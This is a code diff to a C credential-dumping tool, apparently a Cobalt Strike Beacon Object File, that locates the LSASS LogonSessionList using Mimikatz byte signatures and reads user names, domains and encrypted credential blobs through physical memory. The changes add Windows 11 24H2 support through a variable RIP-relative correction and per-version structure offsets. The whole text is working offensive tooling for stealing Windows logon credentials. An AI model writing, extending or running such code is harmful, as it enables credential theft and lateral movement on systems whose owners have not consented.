@@ -36,6 +36,7 @@ DWORD64 SearchForLogonSessionListHead(HANDLE hFile, DWORD64 DataSectionBase, DWO
     unsigned char* LogonSessionListSig = NULL;
     int SigSize = 0;
     int LogonSessionList_OFFSET = 0;
+    int RipCorrection = 4;
 
     //
     // Get the correct Mimikatz byte sequences and offsets based on version
@@ -49,6 +50,7 @@ DWORD64 SearchForLogonSessionListHead(HANDLE hFile, DWORD64 DataSectionBase, DWO
             LogonSessionListSig = LsassLogonSessionListArray[i].LogonSessionListSig;
             SigSize = LsassLogonSessionListArray[i].SigSize;
             LogonSessionList_OFFSET = LsassLogonSessionListArray[i].LogonSessionList_OFFSET;
+            RipCorrection = LsassLogonSessionListArray[i].RipCorrection;
             break;
         }
     }
@@ -104,10 +106,11 @@ DWORD64 SearchForLogonSessionListHead(HANDLE hFile, DWORD64 DataSectionBase, DWO
 
     /*
         RIP-relative offsets are calculated from the instruction *following* the offset.
-        Mimikatz resolves the address 4 bytes too early (pointing directly at the offset),
-        so we must add 4 bytes to correct the final address.
+        Mimikatz resolves the address 4 bytes too early (pointing directly at the offset).
+        RipCorrection accounts for the remaining bytes to the end of the instruction (4 for
+        standard LEA; 9 for Win11 24H2 where the encoding is longer).
     */
-    DWORD64 Real_LogonSessionList_Address = LogonSessionList_PatternAddress + LogonSessionList_RipOffset + 4;
+    DWORD64 Real_LogonSessionList_Address = LogonSessionList_PatternAddress + LogonSessionList_RipOffset + RipCorrection;
     DWORD64 LogonSessionListPA = 0;
     if (!TranslateUVA2Physical(Real_LogonSessionList_Address, &LogonSessionListPA, lower32bits, LsassPID))
     {
@@ -130,7 +133,7 @@ DWORD64 SearchForLogonSessionListHead(HANDLE hFile, DWORD64 DataSectionBase, DWO
     return Real_LogonSessionList_Address;
 }
 
-BOOL DisplayLogonSessionListInformation(HANDLE hFile, DWORD64 LogonSessionListHead, DWORD lower32bits, DWORD LsassPID, unsigned char* Real3DesKey, int i3DesKeyLength, unsigned char* InitializationVector)
+BOOL DisplayLogonSessionListInformation(HANDLE hFile, DWORD64 LogonSessionListHead, DWORD lower32bits, DWORD LsassPID, unsigned char* Real3DesKey, int i3DesKeyLength, unsigned char* InitializationVector, int UserNameOffset, int DomainOffset, int CredentialsOffset)
 {
     DWORD64 tmpPA = 0;
     DWORD64 kMSV1_0_LIST_63 = 0;
@@ -156,7 +159,7 @@ BOOL DisplayLogonSessionListInformation(HANDLE hFile, DWORD64 LogonSessionListHe
         BeaconFormatPrintf(&outputbuffer, "[%04d] Flink Base Address  : 0x%llx\n", i, Flink);
 
 
-        wchar_t* UserNameWideString = ReadUnicodeStringFromPhysical(hFile, FlinkPA + LSA_UNICODE_STRING_UserName, lower32bits, LsassPID);
+        wchar_t* UserNameWideString = ReadUnicodeStringFromPhysical(hFile, FlinkPA + UserNameOffset, lower32bits, LsassPID);
         if (UserNameWideString == NULL || *UserNameWideString == L'\0')
             UserNameWideString = L"(null)";
 
@@ -172,7 +175,7 @@ BOOL DisplayLogonSessionListInformation(HANDLE hFile, DWORD64 LogonSessionListHe
         }
 
 
-        wchar_t* DomainNameWideString = ReadUnicodeStringFromPhysical(hFile, FlinkPA + LSA_UNICODE_STRING_Domain, lower32bits, LsassPID);
+        wchar_t* DomainNameWideString = ReadUnicodeStringFromPhysical(hFile, FlinkPA + DomainOffset, lower32bits, LsassPID);
         if (DomainNameWideString == NULL || *DomainNameWideString == L'\0')
             DomainNameWideString = L"(null)";
 
@@ -196,7 +199,7 @@ BOOL DisplayLogonSessionListInformation(HANDLE hFile, DWORD64 LogonSessionListHe
 
         // Below is for getting the Crypto Blob
         // poi( poi(lsasrv!LogonSessionList) + 0x108)
-        TranslateUVA2Physical(Flink + PKIWI_MSV1_0_CREDENTIALS_Credentials, &tmpPA, lower32bits, LsassPID);
+        TranslateUVA2Physical(Flink + CredentialsOffset, &tmpPA, lower32bits, LsassPID);
         DWORD64 credentialsStruct = ReadAddressAtPhysicalAddressLocation(hFile, tmpPA);
         if ( (_wcsicmp(UserNameWideString, L"(null)") != 0 ) && (_wcsicmp(DomainNameWideString, L"(null)") != 0) && (credentialsStruct != 0) )
         {
